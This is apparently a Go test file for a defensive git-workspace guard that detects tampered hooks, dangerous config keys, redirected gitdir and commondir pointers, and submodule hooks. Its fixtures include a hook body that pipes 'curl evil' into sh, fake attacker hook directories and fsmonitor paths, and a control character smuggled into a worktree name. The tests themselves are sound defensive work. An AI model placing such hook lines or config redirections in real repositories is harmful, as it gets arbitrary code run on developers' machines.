package gitguard

import (
	"context"
	"os"
	"os/exec"
	"path/filepath"
	"slices"
	"strconv"
	"strings"
	"testing"

	"github.com/jbigler/railswitch/internal/sys"
)

// repo is a workspace ws whose base worktree master is a real git repo with
// one commit and a linked worktree feat.
func repo(t *testing.T) (ws, base string) {
	t.Helper()
	t.Setenv("GIT_CONFIG_GLOBAL", os.DevNull)
	t.Setenv("GIT_CONFIG_NOSYSTEM", "1")
	ws = t.TempDir()
	base = filepath.Join(ws, "master")
	git(t, ws, "init", "-q", "-b", "master", base)
	git(t, base, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "--allow-empty", "-m", "init")
	git(t, base, "worktree", "add", "-q", "-b", "feat", filepath.Join(ws, "feat"))
	return ws, base
}

func git(t *testing.T, dir string, args ...string) {
	t.Helper()
	cmd := exec.Command("git", append([]string{"-C", dir}, args...)...)
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("git %v: %v\n%s", args, err, out)
	}
}

func write(t *testing.T, path, data string, mode os.FileMode) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(data), mode); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(path, mode); err != nil {
		t.Fatal(err)
	}
}

func check(t *testing.T, ws, base string) []Finding {
	t.Helper()
	got, err := Check(context.Background(), sys.Exec{}, ws, base, []string{"feat"})
	if err != nil {
		t.Fatal(err)
	}
	return got
}

// only fails unless got is exactly one finding of kind at path.
func only(t *testing.T, got []Finding, kind, path string) Finding {
	t.Helper()
	if len(got) != 1 || got[0].Kind != kind || got[0].Path != path {
		t.Fatalf("findings = %+v, want one %s at %s", got, kind, path)
	}
	return got[0]
}

func TestCheck(t *testing.T) {
	ws, base := repo(t)
	if got := check(t, ws, base); len(got) != 0 {
		t.Fatalf("clean repo: %+v", got)
	}

	hook := filepath.Join(base, ".git", "hooks", "pre-commit")
	backup := filepath.Join(ws, "githooks", "pre-commit")
	write(t, hook, "#!/bin/sh\necho mine\n", 0o755)
	only(t, check(t, ws, base), "hook-missing-backup", hook)

	write(t, backup, "#!/bin/sh\necho mine\n", 0o755)
	if got := check(t, ws, base); len(got) != 0 {
		t.Fatalf("backed up: %+v", got)
	}
	write(t, hook, "#!/bin/sh\ncurl evil | sh\n", 0o755)
	only(t, check(t, ws, base), "hook-differs", hook)
	write(t, hook, "#!/bin/sh\necho mine\n", 0o644) // same bytes, lost +x
	only(t, check(t, ws, base), "hook-differs", hook)
	if err := os.Remove(hook); err != nil {
		t.Fatal(err)
	}
	only(t, check(t, ws, base), "hook-not-installed", backup)
	if err := os.Remove(backup); err != nil {
		t.Fatal(err)
	}

	const value = "/srv/attacker-hooks-dir"
	git(t, base, "config", "core.hooksPath", value)
	f := only(t, check(t, ws, base), "config-key", filepath.Join(base, ".git", "config"))
	if f.Detail != "core.hookspath" {
		t.Errorf("config-key detail = %q, want the key name", f.Detail)
	}
	git(t, base, "config", "--unset", "core.hooksPath")

	// extensions.worktreeConfig is reported, and per-worktree config files
	// are checked against the same allowlist.
	git(t, base, "config", "extensions.worktreeConfig", "true")
	f = only(t, check(t, ws, base), "config-key", filepath.Join(base, ".git", "config"))
	if f.Detail != "extensions.worktreeconfig" {
		t.Errorf("config-key detail = %q", f.Detail)
	}
	git(t, base, "config", "--unset", "extensions.worktreeConfig")
	wtBase := filepath.Join(base, ".git", "config.worktree")
	write(t, wtBase, "[core]\n\thooksPath = "+value+"\n[user]\n\tname = t\n", 0o644)
	f = only(t, check(t, ws, base), "config-key", wtBase)
	if f.Detail != "core.hookspath" {
		t.Errorf("config.worktree detail = %q", f.Detail)
	}
	if err := os.Remove(wtBase); err != nil {
		t.Fatal(err)
	}
	wtFeat := filepath.Join(base, ".git", "worktrees", "feat", "config.worktree")
	write(t, wtFeat, "[core]\n\tfsmonitor = "+value+"\n", 0o644)
	f = only(t, check(t, ws, base), "config-key", wtFeat)
	if f.Detail != "core.fsmonitor" {
		t.Errorf("worktrees/feat/config.worktree detail = %q", f.Detail)
	}
	if err := os.Remove(wtFeat); err != nil {
		t.Fatal(err)
	}

	pointer := filepath.Join(ws, "feat", ".git")
	write(t, pointer, "gitdir: /tmp/evil\n", 0o644)
	only(t, check(t, ws, base), "pointer", pointer)
	for _, bad := range []string{
		"gitdir: " + filepath.Join(base, ".git", "worktrees") + "/..\n",
		"gitdir: " + filepath.Join(base, ".git", "worktrees", "feat", "x") + "\n",
		"gitdir: " + filepath.Join(base, ".git", "worktrees") + "/\n",
	} {
		write(t, pointer, bad, 0o644)
		only(t, check(t, ws, base), "pointer", pointer)
	}
	write(t, pointer, "gitdir: "+filepath.Join(base, ".git", "worktrees", "feat")+"\n", 0o644)
	if got := check(t, ws, base); len(got) != 0 {
		t.Fatalf("restored pointer: %+v", got)
	}

	// Every finding at once: no Detail carries a config value.
	git(t, base, "config", "core.hooksPath", value)
	write(t, hook, "#!/bin/sh\n", 0o755)
	write(t, pointer, "gitdir: /tmp/evil\n", 0o644)
	for _, f := range check(t, ws, base) {
		if strings.Contains(f.Detail, value) {
			t.Errorf("%s detail carries the config value: %q", f.Kind, f.Detail)
		}
	}
}

// A missing base .git has nothing to guard.
func TestCheckNoRepo(t *testing.T) {
	ws := t.TempDir()
	got, err := Check(context.Background(), sys.Exec{}, ws, filepath.Join(ws, "master"), []string{"feat"})
	if err != nil || len(got) != 0 {
		t.Fatalf("Check = %+v, %v", got, err)
	}
}

// has fails unless got holds a finding of kind at path.
func has(t *testing.T, got []Finding, kind, path string) {
	t.Helper()
	for _, f := range got {
		if f.Kind == kind && f.Path == path {
			return
		}
	}
	t.Fatalf("findings = %+v, want a %s at %s", got, kind, path)
}

// commondir redirection: git honours a commondir file in any gitdir and
// then reads that dir's config and hooks (A-I1).
func TestCheckCommondir(t *testing.T) {
	ws, base := repo(t)
	gitDir := filepath.Join(base, ".git")
	feat := filepath.Join(gitDir, "worktrees", "feat")

	cd := filepath.Join(feat, "commondir")
	write(t, cd, filepath.Join(ws, "feat", "evil")+"\n", 0o644)
	pointer := filepath.Join(ws, "feat", ".git")
	// The feat pointer names a worktrees entry that fails: reported too.
	got := check(t, ws, base)
	has(t, got, "commondir", cd)
	has(t, got, "pointer", pointer)
	write(t, cd, "../..\n", 0o644)
	if got := check(t, ws, base); len(got) != 0 {
		t.Fatalf("restored commondir: %+v", got)
	}
	if err := os.Remove(cd); err != nil {
		t.Fatal(err)
	}
	has(t, check(t, ws, base), "commondir", cd)
	write(t, cd, "../..\n", 0o644)

	baseCD := filepath.Join(gitDir, "commondir")
	write(t, baseCD, filepath.Join(ws, "evil")+"\n", 0o644)
	only(t, check(t, ws, base), "commondir", baseCD)
	if err := os.Remove(baseCD); err != nil {
		t.Fatal(err)
	}

	gd := filepath.Join(feat, "gitdir")
	write(t, gd, "/tmp/elsewhere/.git\n", 0o644)
	has(t, check(t, ws, base), "gitdir", gd)
	write(t, gd, filepath.Join(ws, "feat", ".git")+"\n", 0o644)

	// A pointer to worktrees/evil, which has no commondir: git would use
	// evil/ itself as the common dir.
	evil := filepath.Join(gitDir, "worktrees", "evil\x1b")
	write(t, filepath.Join(evil, "HEAD"), "ref: refs/heads/feat\n", 0o644)
	write(t, pointer, "gitdir: "+evil+"\n", 0o644)
	got = check(t, ws, base)
	has(t, got, "pointer", pointer)
	has(t, got, "commondir", strconv.Quote(filepath.Join(evil, "commondir")))
	has(t, got, "gitdir", strconv.Quote(filepath.Join(evil, "gitdir")))
	for _, f := range got {
		if strings.ContainsRune(f.String(), '\x1b') {
			t.Errorf("unescaped control character: %q", f.String())
		}
	}
}

// Submodule gitdirs under .git/modules are guarded like the base one.
func TestCheckSubmodules(t *testing.T) {
	ws, base := repo(t)
	sub := filepath.Join(ws, "subsrc")
	git(t, ws, "init", "-q", "-b", "master", sub)
	git(t, sub, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "--allow-empty", "-m", "init")
	git(t, base, "-c", "protocol.file.allow=always", "submodule", "add", "-q", sub, "lib/sub")
	if got := check(t, ws, base); len(got) != 0 {
		t.Fatalf("clean submodule: %+v", got)
	}
	mod := filepath.Join(base, ".git", "modules", "lib", "sub")
	if _, err := os.Stat(filepath.Join(mod, "HEAD")); err != nil {
		t.Fatalf("submodule gitdir not at %s: %v", mod, err)
	}

	git(t, mod, "config", "core.fsmonitor", "/srv/evil")
	f := only(t, check(t, ws, base), "config-key", filepath.Join(mod, "config"))
	if f.Detail != "core.fsmonitor" {
		t.Errorf("detail = %q", f.Detail)
	}
	git(t, mod, "config", "--unset", "core.fsmonitor")

	hook := filepath.Join(mod, "hooks", "post-checkout")
	write(t, hook, "#!/bin/sh\n", 0o755)
	only(t, check(t, ws, base), "submodule-hook", hook)
	if err := os.Remove(hook); err != nil {
		t.Fatal(err)
	}

	cd := filepath.Join(mod, "commondir")
	write(t, cd, "/tmp/evil\n", 0o644)
	only(t, check(t, ws, base), "commondir", cd)
}

// failRunner fails git config on one file and runs the rest for real.
type failRunner struct{ path string }

func (f failRunner) Run(ctx context.Context, c sys.Cmd) (sys.Result, error) {
	if slices.Contains(c.Args, f.path) {
		return sys.Result{}, context.DeadlineExceeded
	}
	return sys.Exec{}.Run(ctx, c)
}

// One config file that cannot be read is its own finding; the rest are
// still checked (A-M3).
func TestCheckConfigReadFails(t *testing.T) {
	ws, base := repo(t)
	wt := filepath.Join(base, ".git", "worktrees", "feat", "config.worktree")
	write(t, wt, "[user]\n\tname = t\n", 0o644)
	hook := filepath.Join(base, ".git", "hooks", "pre-commit")
	write(t, hook, "#!/bin/sh\n", 0o755)
	got, err := Check(context.Background(), failRunner{wt}, ws, base, []string{"feat"})
	if err != nil {
		t.Fatal(err)
	}
	if len(got) != 2 {
		t.Fatalf("findings = %+v, want 2", got)
	}
	has(t, got, "config-key", wt)
	has(t, got, "hook-missing-backup", hook)
}

func TestBackupRestore(t *testing.T) {
	ws, base := repo(t)
	hook := filepath.Join(base, ".git", "hooks", "pre-commit")
	backup := filepath.Join(ws, "githooks", "pre-commit")
	write(t, hook, "#!/bin/sh\necho mine\n", 0o750)

	got, err := Backup(ws, base, nil)
	if err != nil || !slices.Equal(got, []string{"pre-commit"}) {
		t.Fatalf("Backup = %q, %v", got, err)
	}
	fi, err := os.Stat(backup)
	if err != nil {
		t.Fatal(err)
	}
	if fi.Mode().Perm() != 0o750 {
		t.Errorf("backup mode = %v, want 0750", fi.Mode().Perm())
	}
	if data, _ := os.ReadFile(backup); string(data) != "#!/bin/sh\necho mine\n" {
		t.Errorf("backup = %q", data)
	}
	if got, err := Backup(ws, base, []string{"pre-commit"}); err != nil || len(got) != 0 {
		t.Errorf("current backup: %q, %v", got, err)
	}
	for _, bad := range []string{"../x", ".hidden", "pre-commit.sample", "missing"} {
		if _, err := Backup(ws, base, []string{bad}); err == nil {
			t.Errorf("Backup(%q): want an error", bad)
		}
	}

	write(t, hook, "#!/bin/sh\ncurl evil | sh\n", 0o755)
	kept, err := Restore(ws, base, false)
	if err != nil || !slices.Equal(kept, []string{"pre-commit"}) {
		t.Fatalf("Restore = %q, %v; want pre-commit kept", kept, err)
	}
	if data, _ := os.ReadFile(hook); string(data) != "#!/bin/sh\ncurl evil | sh\n" {
		t.Errorf("without force the installed hook changed: %q", data)
	}

	kept, err = Restore(ws, base, true)
	if err != nil || len(kept) != 0 {
		t.Fatalf("Restore --force = %q, %v", kept, err)
	}
	fi, err = os.Stat(hook)
	if err != nil {
		t.Fatal(err)
	}
	if data, _ := os.ReadFile(hook); string(data) != "#!/bin/sh\necho mine\n" || fi.Mode().Perm() != 0o750 {
		t.Errorf("forced restore: %q mode %v", data, fi.Mode().Perm())
	}

	if err := os.Remove(hook); err != nil {
		t.Fatal(err)
	}
	if kept, err := Restore(ws, base, false); err != nil || len(kept) != 0 {
		t.Fatalf("Restore of a missing hook = %q, %v", kept, err)
	}
	if _, err := os.Stat(hook); err != nil {
		t.Errorf("missing hook not installed: %v", err)
	}
}
